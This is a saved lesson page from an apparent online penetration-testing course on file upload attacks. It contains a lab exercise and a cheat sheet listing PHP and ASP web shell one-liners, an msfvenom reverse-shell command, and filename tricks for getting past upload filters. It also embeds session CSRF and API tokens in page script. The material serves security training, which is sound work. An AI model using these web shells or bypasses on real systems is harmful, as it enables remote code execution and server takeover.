// Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
// </span>
// </div>
// </p>
// </div>
// <div class="col-3 text-right float-right">
// <button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-toggle="modal" data-target="#cheatSheetModal">
// <div><i class="fad fa-file-alt mr-2"></i></div>
// <div class="text-center w-100 ml-1">Cheat Sheet</div>
// </button>
// </div>
// </div>
// <div>
// <div>
// <label class="module-question" for="857"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)
// </label>
// <div class="row">
// <div class="col-lg-12 mb-4">
// <input class="form-control bg-color-blue-nav" id="answer857" type="text" color="green" placeholder="Submit your answer here..." maxlength="191">
// </div>
// <div class="d-flex justify-content-end w-100 mr-3">
// <p id="questionStreakPointsText-857" class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white">
// +10 Streak pts</p>
// <div class="mb-4 mr-1 d-flex align-items-center">
// <button class="btn btn-primary btn-block btnAnswer" id="btnAnswer857" data-question-id="857">
// <div class="submit-button-text">
// <i class="fad fa-flag-checkered mr-2"></i> Submit
// </div>
// <div class="submit-button-loader mx-4 d-none">
// <i class="fa fa-circle-notch fa-spin"></i>
// </div>
// </button>
// </div>
// <div class="mb-4  mr-1">
// <button class="btn btn-outline-warning btn-block" data-toggle="modal" id="hintBtn857" data-target="#hint857"><i class="fad fa-life-ring mr-2"></i> Hint
// </button>
// </div>
// </div>
// </div>
// <div class>
// </div>
// </div>
// </div>
// </div>
// </div>
// </div>
// <div class="card bg-color-blue-nav" style="margin: 30px 0">
// <div class="card-body">
// <a href="https://academy.hackthebox.com/module/136/section/1261" class="btn btn-light module-button py-2" style="float: left"><i class="fa fa-arrow-alt-left mr-1"></i> Previous</a>
// <form action="https://academy.hackthebox.com/module" method="POST" class="form-inline" id="completeForm" style="float: right">
// <input type="hidden" name="module_id" value="136">
// <input type="hidden" name="page_id" value="5">
// <input type="hidden" name="completed" value="1">
// <p id="completeBtnPoints" class="mb-0 mr-3 font-size-14 font-medium text-white d-none">
// +10 Streak pts</p>
// <button id="completeBtn" class="btn btn-outline-success" style="display: none;">
// <div id="complete-button-text">
// <i class="fa fa-check-circle"></i> Mark Complete & Next
// </div>
// <div id="complete-button-loader" class="mx-5 d-none">
// <i class="fa fa-circle-notch fa-spin"></i>
// </div>
// </button>
// </form>
// <a href="https://academy.hackthebox.com/module/136/section/1288" class="btn btn-light ml-2 module-button py-2" style="float: left">Next <i class="ml-1 fa fa-arrow-alt-right"></i></a>
// </div>
// </div>
// </div>
// <div class="col-md-12 col-xl-3 col-xxl-3">
// <div id="table-of-contents">
// <div class="card">
// <div class="card-body bg-color-blue-nav">
// <button class="btn btn-light btn-block module-button" data-toggle="modal" data-target="#cheatSheetModal"><i class="fad fa-file-alt mr-2"></i> Cheat Sheet
// </button>
// <a href="#questionsDiv" class="btn btn-light btn-block module-button"><i class="fad fa-question mr-2"></i> Go to Questions</a>
// </div>
// </div>
// <div class="card" id="TOC">
// <div class="card-body bg-color-blue-nav">
// <h5 class="card-title font-size-15 mb-4">Table of Contents</h5>
// <a href="https://academy.hackthebox.com/module/136/section/1259" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
// <span class="font-size-13">Intro to File Upload Attacks</span>
// <i class="fad fa-check-square text-success float-right mt-1" style="top: 2px"></i>
// </a>
// <h6 class="mt-4 mb-2">Basic Exploitation</h6> <a href="https://academy.hackthebox.com/module/136/section/1260" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
// <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
// <span class="font-size-13">Absent Validation</span>
// <i class="fad fa-check-square text-success float-right mt-1" style="top: 2px"></i>
// </a>
// <a href="https://academy.hackthebox.com/module/136/section/1261" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
// <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
// <span class="font-size-13">Upload Exploitation</span>
// <i class="fad fa-check-square text-success float-right mt-1" style="top: 2px"></i>
// </a>
// <h6 class="mt-4 mb-2">Bypassing Filters</h6> <a href="https://academy.hackthebox.com/module/136/section/1280" class="btn   text-primary  btn-sm btn-block mt-1 py-2 text-left btn-lighter">
// <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
// <span class="font-size-13">Client-Side Validation</span>
// </a>
// <a href="https://academy.hackthebox.com/module/136/section/1288" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
// <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
// <span class="font-size-13">Blacklist Filters</span>
// </a>
// <a href="https://academy.hackthebox.com/module/136/section/1289" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
// <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
// <span class="font-size-13">Whitelist Filters</span>
// </a>
// <a href="https://academy.hackthebox.com/module/136/section/1290" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
// <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
// <span class="font-size-13">Type Filters</span>
// </a>
// <h6 class="mt-4 mb-2">Other Upload Attacks</h6> <a href="https://academy.hackthebox.com/module/136/section/1291" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
// <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
// <span class="font-size-13">Limited File Uploads</span>
// </a>
// <a href="https://academy.hackthebox.com/module/136/section/1292" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
// <span class="font-size-13">Other Upload Attacks</span>
// </a>
// <h6 class="mt-4 mb-2">Prevention</h6> <a href="https://academy.hackthebox.com/module/136/section/1309" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
// <span class="font-size-13">Preventing File Upload Vulnerabilities</span>
// </a>
// <h6 class="mt-4 mb-2">Skills Assessment</h6> <a href="https://academy.hackthebox.com/module/136/section/1310" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
// <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
// <span class="font-size-13">Skills Assessment - File Upload Attacks</span>
// <i class="fad fa-check-square text-success float-right mt-1" style="top: 2px"></i>
// </a>
// </div>
// </div>
// <div class="card">
// <div class="card-body bg-color-blue-nav">
// <h5 class="card-title mb-4">My Workstation</h5>
// <div class="row">
// <div class="col-12">
// <div id="sidePreview" style="height: 160px; border: 1px solid #323232; border-radius: 5px; background-color: #0a121c; text-align: center">
// <div class="screenPlaceholder">
// <p class="instanceStart" style="padding-top:70px; letter-spacing: 5px;">
// OFFLINE</p>
// <p class="instanceLoading " style="padding-top:70px; display: none"><i class="fa fa-circle-notch fa-spin"></i> Starting...</p>
// </div>
// </div>
// </div>
// <div class="col-12 mt-2">
// <div class="instanceStart">
// <button class="startInstanceBtn btn btn-success text-light btn-sm mt-2 btn-block module-button py-2  ">
// <i class="fad fa-play-circle text-light"></i> &nbsp;Start Instance
// </button>
// <p class="text-center mt-2 font-size-13 font-secondary">
// <span class="text-success spawnsLeft">
// <i class="fal fa-infinity"></i>
// </span> / 1 spawns left
// </p>
// </div>
// <button style="display:none;" class="fullScreenBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-expand text-success"></i> &nbsp;Interact
// </button>
// <button style="display:none;" class="terminateInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-times text-danger"></i> &nbsp;Terminate
// </button>
// <button style="display:none;" class="resetInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-sync text-warning"></i> &nbsp;Reset
// </button>
// <div class="btn-group" role="group">
// <button style="display:none; cursor: default;" class=" extendInstanceBtn btn btn-light btn-sm mt-2 module-button py-2">Life
// Left: <span class="lifeLeft"></span>m
// </button>
// <button style="display:none;" data-toggle="tooltip" data-title="Extend Life" class=" extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm mt-2 module-button py-2">
// <i class="fa fa-plus text-success"></i></button>
// </div>
// </div>
// </div>
// </div>
// </div>
// </div>
// </div>
// </div>
// <div id="hint857" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="hint857" aria-hidden="true">
// <div class="modal-dialog modal-dialog-centered">
// <div class="modal-content">
// <div class="modal-body">
// <div class="text-center">
// <h5><i class="fad fa-life-ring text-success"></i>&nbsp; Hint</h5>
// <br>
// <h6>Try to locate the function responsible for validating the input type, then try to remove it without breaking the upload functionality</h6>
// </div>
// </div>
// </div>
// </div>
// </div>
// <div id="cheatSheetModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="unlockModuleModal" aria-hidden="true">
// <div class="modal-dialog modal-lg">
// <div class="modal-content">
// <div class="modal-body">
// <div class="text-center text-break">
// <h5><i class="fad fa-file-alt"></i>&nbsp; Cheat Sheet</h5>
// <p>The cheat sheet is a useful command reference for this module.</p>
// <h2>Web Shells</h2>
// <table>
// <thead>
// <tr>
// <th><strong>Web Shell</strong></th>
// <th><strong>Description</strong></th>
// </tr>
// </thead>
// <tbody>
// <tr>
// <td><code>&lt;?php file_get_contents('/etc/passwd'); ?&gt;</code></td>
// <td>Basic PHP File Read</td>
// </tr>
// <tr>
// <td><code>&lt;?php system('hostname'); ?&gt;</code></td>
// <td>Basic PHP Command Execution</td>
// </tr>
// <tr>
// <td><code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code></td>
// <td>Basic PHP Web Shell</td>
// </tr>
// <tr>
// <td><code>&lt;% eval request('cmd') %&gt;</code></td>
// <td>Basic ASP Web Shell</td>
// </tr>
// <tr>
// <td><code>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php</code></td>
// <td>Generate PHP reverse shell</td>
// </tr>
// <tr>
// <td><a href="https://github.com/Arrexel/phpbash">PHP Web Shell</a></td>
// <td>PHP Web Shell</td>
// </tr>
// <tr>
// <td><a href="https://github.com/pentestmonkey/php-reverse-shell">PHP Reverse Shell</a></td>
// <td>PHP Reverse Shell</td>
// </tr>
// <tr>
// <td><a href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells">Web/Reverse Shells</a></td>
// <td>List of Web Shells and Reverse Shells</td>
// </tr>
// </tbody>
// </table>
// <h2>Bypasses</h2>
// <table>
// <thead>
// <tr>
// <th><strong>Command</strong></th>
// <th><strong>Description</strong></th>
// </tr>
// </thead>
// <tbody>
// <tr>
// <td><strong>Client-Side Bypass</strong></td>
// <td></td>
// </tr>
// <tr>
// <td><code>[CTRL+SHIFT+C]</code></td>
// <td>Toggle Page Inspector</td>
// </tr>
// <tr>
// <td><strong>Blacklist Bypass</strong></td>
// <td></td>
// </tr>
// <tr>
// <td><code>shell.phtml</code></td>
// <td>Uncommon Extension</td>
// </tr>
// <tr>
// <td><code>shell.pHp</code></td>
// <td>Case Manipulation</td>
// </tr>
// <tr>
// <td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">PHP Extensions</a></td>
// <td>List of PHP Extensions</td>
// </tr>
// <tr>
// <td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP">ASP Extensions</a></td>
// <td>List of ASP Extensions</td>
// </tr>
// <tr>
// <td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">Web Extensions</a></td>
// <td>List of Web Extensions</td>
// </tr>
// <tr>
// <td><strong>Whitelist Bypass</strong></td>
// <td></td>
// </tr>
// <tr>
// <td><code>shell.jpg.php</code></td>
// <td>Double Extension</td>
// </tr>
// <tr>
// <td><code>shell.php.jpg</code></td>
// <td>Reverse Double Extension</td>
// </tr>
// <tr>
// <td><code>%20</code>, <code>%0a</code>, <code>%00</code>, <code>%0d0a</code>, <code>/</code>, <code>.\</code>, <code>.</code>, <code>…</code></td>
// <td>Character Injection - Before/After Extension</td>
// </tr>
// <tr>
// <td><strong>Content/Type Bypass</strong></td>
// <td></td>
// </tr>
// <tr>
// <td><a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt">Web Content-Types</a></td>
// <td>List of Web Content-Types</td>
// </tr>
// <tr>
// <td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt">Content-Types</a></td>
// <td>List of All Content-Types</td>
// </tr>
// <tr>
// <td><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">File Signatures</a></td>
// <td>List of File Signatures/Magic Bytes</td>
// </tr>
// </tbody>
// </table>
// <h2>Limited Uploads</h2>
// <table>
// <thead>
// <tr>
// <th><strong>Potential Attack</strong></th>
// <th><strong>File Types</strong></th>
// </tr>
// </thead>
// <tbody>
// <tr>
// <td><code>XSS</code></td>
// <td>HTML, JS, SVG, GIF</td>
// </tr>
// <tr>
// <td><code>XXE</code>/<code>SSRF</code></td>
// <td>XML, SVG, PDF, PPT, DOC</td>
// </tr>
// <tr>
// <td><code>DoS</code></td>
// <td>ZIP, JPG, PNG</td>
// </tr>
// </tbody>
// </table>
// </div>
// </div>
// <div class="modal-footer">
// <a class="btn btn-light btn-block" href="https://academy.hackthebox.com/module/cheatsheet/136">Download
// Cheatsheet</a>
// </div>
// </div>
// </div>
// </div>
// <div id="linkDiscordModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="linkDiscordModal" aria-hidden="true">
// <div class="modal-dialog modal-dialog-centered">
// <div class="modal-content">
// <div class="modal-header text-center">
// <h5 class="modal-title w-100">Do you need help with this question?</h5>
// </div>
// <div class="modal-body">
// <div class="text-center">
// <img src="/images/icons/discord-alternative.svg" alt="discord icon">
// <p class="mb-1">It looks like you have not linked your Discord account!</p>
// <p>You can receive question guidance via Discord. </p>
// <a href="https://academy.hackthebox.com/account/discord/link" class="btn btn-outline-success btn-block">
// Link your Discord account
// </a>
// </div>
// </div>
// </div>
// </div>
// </div><div id="referralModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="referralModal" aria-hidden="true" data-backdrop="static">
// <div class="modal-dialog modal-dialog-centered" role="document">
// <div class="modal-content">
// <div class="modal-header text-center border-0">
// <button type="button" class="close" data-dismiss="modal" aria-label="Close">
// <span aria-hidden="true"><img src="/images/close.svg" alt="close" /></span>
// </button>
// </div>
// <div class="modal-body">
// <div class="text-center">
// <img src="/images/htb-coin.svg" alt="coin icon" />
// <h1 class="text-white">Refer &amp; Earn</h1>
// <p class="text-secondary font-size-20">
// Refer a Friend, Earn Cubes, Unlock Academy Modules!
// </p>
// <div class="d-flex flex-column">
// <a href="/referral">
// <button type="button" class="btn btn-success btn-invite-friend text-light my-4">
// Invite Friends
// </button>
// </a>
// <button type="button" id="disableReferralModalBtn" onclick="disableModalRedisplay()" class="btn mt-2 mb-3 d-none">
// Don't show it again
// </button>
// </div>
// </div>
// </div>
// </div>
// </div>
// </div><div id="pwnboxSwitchWarningModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="pwnboxSwitchWarningModal" aria-hidden="true" data-backdrop="static">
// <div class="modal-dialog modal-dialog-centered" role="document">
// <div class="modal-content">
// <div class="modal-header text-center">
// <h2 class="d-inline-flex align-items-center text-white"><span class="font-size-18"><i class="far fa-exclamation-triangle text-danger mr-2"></i></span>Warning</h2>
// <button type="button" class="close" data-dismiss="modal" aria-label="Close">
// <span aria-hidden="true"><img src="/images/close.svg" alt="close" height="16" width="16" /></span>
// </button>
// </div>
// <div class="modal-body pt-0">
// <div class="text-left">
// <h1 class="text-white"></h1>
// <div class="text-secondary font-size-14 px-2">
// <p>
// The current instance of Pwnbox <span class="font-medium text-white">will be terminated</span> when switching to a new region.
// </p>
// <p>
// <span class="font-medium text-white">All progress you've made will be lost.</span> Do you want to continue?
// </p>
// </div>
// </div>
// </div>
// <div class="modal-footer">
// <button type="button" id="cancelPwnboxSwitchBtn" class="btn cancel-btn px-5">
// Cancel
// </button>
// <button type="button" id="continuePwnboxSwitchBtn" class="btn continue-btn px-5 text-light">
// <span id="continuePwnboxSwitchBtnText">Continue</span>
// <div class="pwnboxSwitchModalLoader spinner-border d-none" role="status">
// <span class="sr-only">Switching VPN...</span>
// </div>
// </button>
// </div>
// </div>
// </div>
// </div><div id="vpnSwitchWarningModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="vpnSwitchWarningModal" aria-hidden="true" data-backdrop="static">
// <div class="modal-dialog modal-dialog-centered" role="document">
// <div class="modal-content">
// <div class="modal-header text-center">
// <h2 class="d-inline-flex align-items-center text-white"><span class="font-size-18"><i class="far fa-exclamation-triangle text-danger mr-2"></i></span>Warning</h2>
// <button type="button" class="close" data-dismiss="modal" aria-label="Close">
// <span aria-hidden="true"><img src="/images/close.svg" alt="close" height="16" width="16" /></span>
// </button>
// </div>
// <div class="modal-body pt-0">
// <div class="text-left">
// <h1 class="text-white"></h1>
// <div class="text-secondary font-size-14 px-2">
// <p>
// All VM instances associated with the old VPN Server <span class="font-medium text-white">will be terminated</span> when switching to
// a new VPN server. Existing PwnBox instances
// <span class="font-medium text-white">will automatically switch</span>
// to the new VPN server.
// </p>
// <p>
// <span class="font-medium text-white">All progress you've made, will
// be lost,</span> do you want to continue?
// </p>
// </div>
// </div>
// </div>
// <div class="modal-footer">
// <button type="button" id="cancelVpnSwitchBtn" class="btn cancel-btn px-5">
// Cancel
// </button>
// <button type="button" id="continueVpnSwitchBtn" class="btn continue-btn px-5 text-light">
// <span id="continueVpnSwitchBtnText">Continue</span>
// <div class="vpnSwitchModalLoader spinner-border d-none" role="status">
// <span class="sr-only">Switching VPN...</span>
// </div>
// </button>
// </div>
// </div>
// </div>
// </div><div id="solutionPreferencesModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="solutionPreferencesModal" aria-hidden="true">
// <div class="modal-dialog modal-dialog-centered">
// <div class="modal-content pt-4 pl-4 pr-4 pb-3">
// <div class="modal-header text-center flex-column align-items-center p-0 font-size-18 font-bold">
// <img src="/images/icons/contact-support.svg" alt="contact support icon">
// <h5 class="modal-title w-100 text-white mt-2">Do you need help with this question?</h5>
// </div>
// <div class="modal-body p-0 mt-2 font-size-16">
// <div class="text-center">
// <p class="mb-0">You have the option to enable step-by-step solutions for all questions.</p>
// <p class="mb-0">You can manage this preference at any time through your profile settings.</p>
// </div>
// </div>
// <div class="modal-footer align-items-center justify-content-center p-0 mt-4 gap-12">
// <button class="btn btn-outline-secondary text-white font-medium" onclick="handleSolutionPreferencesModalAction(false)">
// Don't show Solutions
// </button>
// <button class="btn btn-success text-light font-medium" onclick="handleSolutionPreferencesModalAction(true)">
// Activate Solutions
// </button>
// </div>
// </div>
// </div>
// </div>
// <div class="streaks-container">
// </div>
// </div>
// <footer class="footer">
// <div class="container-fluid">
// <div class="row">
// <div class="col-sm-6">
// </div>
// <div class="col-sm-6">
// <div class="text-sm-right d-none d-sm-block">
// Powered by &nbsp; <a href="https://www.hackthebox.com" target="_blank"><img style="margin-bottom: 1px;" src="/images/logo-htb.svg" height="20px" alt="Hack The Box logo"></a>
// </div>
// </div>
// </div>
// </div>
// </footer>
// </div>
// </div>
// </div>
// <script src="/assets/libs/jquery/jquery.min.js"></script>
// <link rel="preload" as="style" href="https://academy.hackthebox.com/build/assets/vue-radial-progress-a171cc18.css" /><link rel="preload" as="style" href="https://academy.hackthebox.com/build/assets/app-9c6116ce.css" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/app-7a0ef707.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/lodash-4cdd6148.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue-pusher-31bd95f4.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue-markdown-render-a7356682.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue-router-0fe68d5f.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vuex-6e8de79e.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue-radial-progress-388a78c0.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/popper-cca4b372.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vuejs-countdown-timer-a77e56c8.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue-screen-2a148c9c.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue2-perfect-scrollbar-479bab7f.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/main-894c550b.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/just-detect-adblock-c3d9cfa8.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/referral-2770e5b2.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/prism-c677b05a.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/detectBrowser-2863cb72.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/core-helpers-6225cbbf.js" /><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/index-2fce9ee8.js" /><link rel="stylesheet" href="https://academy.hackthebox.com/build/assets/vue-radial-progress-a171cc18.css" /><link rel="stylesheet" href="https://academy.hackthebox.com/build/assets/app-9c6116ce.css" /><script type="module" src="https://academy.hackthebox.com/build/assets/app-7a0ef707.js"></script><script type="module" src="https://academy.hackthebox.com/build/assets/main-894c550b.js"></script><script type="module" src="https://academy.hackthebox.com/build/assets/referral-2770e5b2.js"></script><script type="module" src="https://academy.hackthebox.com/build/assets/prism-c677b05a.js"></script><script type="module" src="https://academy.hackthebox.com/build/assets/detectBrowser-2863cb72.js"></script><script type="module" src="https://academy.hackthebox.com/build/assets/core-helpers-6225cbbf.js"></script>
// <script src="/assets/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
// <script src="/assets/libs/simplebar/simplebar.min.js"></script>
// <script src="/assets/libs/node-waves/waves.min.js"></script>
// <script src="/assets/libs/toastr/toastr.min.js"></script>
// <script>
//         $(document).ready(function() {
//             const csrfToken = 'RYPoLgf5o4PSLRshDqoein6i6b0yWF7CYcaHjSJX';
//             const apiToken= '2mc0cqurOkKH9Wv4eLFuTsEzSful1fRbuNSp60OqcbfT0EPrj7KsF5vA9ozCqsV7mTz5LfayhksPuM19';
                
//             initAxios(csrfToken,apiToken);
//         });
//     </script>
// <script src="https://cdn.jsdelivr.net/npm/bootstrap-select@1.13.14/dist/js/bootstrap-select.min.js"></script>
// <script type="module">
//     import { register } from '/assets/libs/core-web-components/index.js';
//       register();
// </script>
// <script>
//       let currentBrowser;
//       let isPwnboxActive = false;
//       let isTargetActive = false;
//       let vmCheckTimer;
//       let areSolutionsEnabled = false;
//       const _showSolutionsSettingSwitch = $('#showSolutionsModuleSetting');
//       const isAnnualUser = false;
//       const isAdmin = false;
//       const isCompanyAdmin = false;
      
//       window.addEventListener('SpawnedPwnBox', () => {
//           isPwnboxActive = true;
//       }, false);

//       window.addEventListener('TerminatedPwnBox', () => {
//           isPwnboxActive = false;
//       }, false);

//       setTimeout(() => {
//           currentBrowser = window.detectBrowser();
//       }, 1000);

//       const AXIOS_ERROR_HANDLING_MESSAGE = 'Something went wrong, please try again later.';

//                 setTimeout(() => {
//               initReferralScheme();
//           }, 1000);
      
//       $('table').addClass('table table-striped text-left').wrap('<div class="table-responsive"></div>');

//       $('.training-module a').attr('target', '_blank').attr('rel', 'noopener nofollow');

//       $('.favouriteBtn').click(function () {
//           let id = $(this).data('module-id');

//           axios.get('/api/modules/favourite/' + id).then(response => {
//               let data = response.data;
//               if (data.fav === 1) {
//             $(this).removeClass('fa-sharp fa-solid fa-regular').addClass('fa-sharp fa-solid');
//                   toastr['success'](data.message, 'Success');
//               } else {
//             $(this).removeClass('fa-sharp fa-solid fa-regular').addClass('fa-regular');
//                   toastr['success'](data.message, 'Success');
//               }
//           }).catch(err => {
//               toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//           });
//       });

//       function encode_utf8(string) {
//           return unescape(encodeURIComponent(string));
//       }

//       function checkSolutionsSettings() {
//         axios.get('/api/v2/user/settings/walkthroughs_enabled').then(response => {
//             areSolutionsEnabled = response.data.data.value;

//             if(areSolutionsEnabled) {
//                 _showSolutionsSettingSwitch.prop('checked', true);
//             }
//         }).catch(error => {
//             toastr['error'](data.message, 'Error');
//         });
//       }

//       function manageSolutionsSettings(enableWriteupSettings) {
//         return axios.put('/api/v2/user/settings/walkthroughs_enabled', {
//             value: enableWriteupSettings
//         });
//       }

//       function handleSolutionPreferencesModalAction(enableWriteupSettings) {
//         manageSolutionsSettings(!areSolutionsEnabled).then(response => {
//             if (response.status === 204) {
//                 areSolutionsEnabled = enableWriteupSettings;
//                 if (areSolutionsEnabled) {
//                     // refresh page to update UI
//                     window.location.reload();
//                 }
//             }
//         }).catch(error => {
//             toastr['error'](error.message, 'Error');
//         }).finally(() => {
//             $('#solutionPreferencesModal').modal('hide');
//         });
//       }

//       _showSolutionsSettingSwitch.on('click', () => {
//             if(isAnnualUser || isAdmin || isCompanyAdmin) {
//                 _showSolutionsSettingSwitch.prop('disabled', true);
//                 manageSolutionsSettings(!areSolutionsEnabled)
//                     .then(response => {
//                         if (response.status === 204) {
//                             areSolutionsEnabled = !areSolutionsEnabled;
//                              // refresh page to update UI
//                              window.location.reload();
//                         }
//                     }).catch(error => {
//                         toastr['error'](error.message, 'Error');
//                     }).finally(() => {
//                         // We add a small delay to avoid possible spam/abuse
//                         setTimeout(() => {
//                             _showSolutionsSettingSwitch.prop('disabled', false);
//                         }, 1500);
//                     });
//             }
//         });

//       $('.btnAnswer').click(function () {
//           let question_id = $(this).data('question-id');
//           $(this).attr('disabled', 1);
//           $(this).find('.submit-button-text').addClass('d-none');
//           $(this).find('.submit-button-loader').removeClass('d-none');
//           let utf8EncodedString = encode_utf8($('#answer' + question_id).val());
//           axios.post('/api/check/answer', {
//               answer: btoa(utf8EncodedString),
//               question_id: question_id
//           }).then(response => {
//               let data = response.data;
//               if (data.success === 0) {
//                   $(this).removeAttr('disabled');
                  
//                   if(data.should_show_walkthrough_modal) {
//                     openSolutionPreferencesModal();
//                   }
                  
//                   toastr['error'](data.message, 'Error');
//               } else {
//                   $(this).attr('disabled', 1);
//                   $('#answer' + question_id).attr('disabled', 1);
//                   $('#answer' + question_id).addClass('text-success');
//                   $('#hintBtn' + question_id).attr('disabled', 1);
//                   $(`.d-discord-${question_id}`).addClass('d-none');
//                   $('#questionStreakPointsText-' + question_id).addClass('d-none');
//                   toastr['success'](data.message, 'Success');
//                   completeCheck();
//               }
//               $(this).find('.submit-button-text').removeClass('d-none');
//               $(this).find('.submit-button-loader').addClass('d-none');
//           }).catch(err => {
//               toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//           });
//       });

//       $('.btnAnswerExercise').click(function () {
//           let exercise_id = $(this).data('exercise-id');
//           $(this).attr('disabled', 1);
//           $(this).find('.submit-button-text').addClass('d-none');
//           $(this).find('.submit-button-loader').removeClass('d-none');
//           let utf8EncodedString = encode_utf8($(`#exerciseAnswer${exercise_id}`).val());
//           axios.post(`/api/check/exercise/${exercise_id}/answer`, {
//               answer: btoa(utf8EncodedString)
//           }).then(response => {
//               let data = response.data;
//               if (data.success === 0) {
//                   $(this).removeAttr('disabled');
//                   toastr['error'](data.message, 'Error');
//               } else {
//                   $(this).attr('disabled', 1);
//                   $(`#exerciseAnswer${exercise_id}`).attr('disabled', 1);
//                   $(`#exerciseAnswer${exercise_id}`).addClass('text-success');
//                   toastr['success'](data.message, 'Success');
//               }
//               $(this).find('.submit-button-text').removeClass('d-none');
//               $(this).find('.submit-button-loader').addClass('d-none');
//           }).catch(err => {
//               toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//           });
//       });

//       $('.btnAnswerExerciseMultiple').click(function () {
//           $(this).attr('disabled', 1);
//           $(this).find('.submit-button-text').addClass('d-none');
//           $(this).find('.submit-button-loader').removeClass('d-none');
//           let exercise_id = $(this).data('exercise-id');
//           $(this).attr('disabled', 1);
//           let utf8EncodedString = $(`#exerciseAnswer${exercise_id}`).find('input:checked').val();
//           axios.post(`/api/check/exercise/${exercise_id}/answer`, {
//               answer: btoa(utf8EncodedString)
//           }).then(response => {
//               let data = response.data;
//               if (data.success === 0) {
//                   $(this).removeAttr('disabled');
//                   toastr['error'](data.message, 'Error');
//                   $(`#exerciseAnswer${exercise_id} input[type=radio]:checked`).parent().parent().find(`.exercise-answer-justification`).removeClass('d-none');
//                   $(`#exerciseAnswer${exercise_id} input[type=radio]:checked`).attr('disabled', 1);
//                   $(`#exerciseAnswer${exercise_id} input[type=radio]:checked`).parent().find('label').addClass('text-danger red');
//               } else {
//                   $(this).attr('disabled', 1);
//                   $(`#exerciseAnswer${exercise_id}`).attr('disabled', 1);
//                   $(`#exerciseAnswer${exercise_id} input[type=radio]:checked`).parent().find('label').addClass('text-success green');
//                   $(`#exerciseAnswer${exercise_id} input[type=radio]:checked`).parent().find('label').removeClass('red');
//                   $(`#exerciseAnswer${exercise_id} input[type=radio]`).attr('disabled', 1);
//                   $(`#exerciseAnswer${exercise_id} .exercise-answer-justification`).removeClass('d-none');
//                   toastr['success'](data.message, 'Success');
//               }
//               $(this).find('.submit-button-text').removeClass('d-none');
//               $(this).find('.submit-button-loader').addClass('d-none');
//           }).catch(err => {
//               toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//           });
//       });

//       $('.reveal-modal').click(e => {
//           let id = $(e.target).data('exercise-id');
//           $(`#revealExerciseAnswer${id}`).modal('hide');
//       });

//       $(document).ready(function () {
//           setTimeout(() => {
//               // we add a delay before calling this function
//               // in order the axios headers to have been set
//               completeCheck();
